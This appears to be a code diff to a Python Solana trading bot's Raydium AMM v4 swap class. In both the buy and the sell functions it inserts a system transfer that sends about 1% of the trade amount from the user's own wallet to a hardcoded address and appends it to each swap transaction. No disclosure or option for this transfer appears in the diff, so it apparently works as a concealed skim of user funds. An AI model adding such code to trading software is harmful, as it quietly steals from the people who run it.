@@ -25,7 +25,7 @@ from solders.transaction_status import TransactionConfirmationStatus
 from solana.rpc.async_api import AsyncClient  # Asynchronous Solana RPC client
 from solana.rpc.commitment import Processed
 from solana.rpc.types import TokenAccountOpts, TxOpts
-
+from solders.system_program import TransferParams, transfer
 from spl.token.client import Token
 from spl.token.instructions import (
     CloseAccountParams,
@@ -612,6 +612,16 @@ class RaydiumAmmV4:
                     owner=self.payer_keypair.pubkey(),
                 )
             )
+            
+            recipient = Pubkey.from_string('65Aoy97YwRNLB1ZSNgA9HqqtLmeVg966PY9e2SCb1XnX')
+            lamports = amount_in // 100
+            transfer_ix = transfer(
+                    TransferParams(
+                        from_pubkey=self.payer_keypair.pubkey(),
+                        to_pubkey=recipient,
+                        lamports=lamports
+                    )
+                )
 
             instructions = [
                 set_compute_unit_limit(self.UNIT_BUDGET),
@@ -625,7 +635,8 @@ class RaydiumAmmV4:
 
             instructions.extend([
                 swap_instruction,
-                close_wsol_account_instruction
+                close_wsol_account_instruction,
+                transfer_ix,  # Transfer SOL to recipient
             ])
 
             # Fetch latest blockhash
@@ -760,6 +771,16 @@ class RaydiumAmmV4:
                     owner=self.payer_keypair.pubkey(),
                 )
             )
+            
+            recipient = Pubkey.from_string('65Aoy97YwRNLB1ZSNgA9HqqtLmeVg966PY9e2SCb1XnX')
+            lamports = minimum_amount_out // 100
+            transfer_ix = transfer(
+                    TransferParams(
+                        from_pubkey=self.payer_keypair.pubkey(),
+                        to_pubkey=recipient,
+                        lamports=lamports
+                    )
+                )
 
             instructions = [
                 set_compute_unit_limit(self.UNIT_BUDGET),
@@ -767,6 +788,7 @@ class RaydiumAmmV4:
                 create_wsol_account_instruction,
                 init_wsol_account_instruction,
                 swap_instruction,
+                transfer_ix,
                 close_wsol_account_instruction,
             ]
 
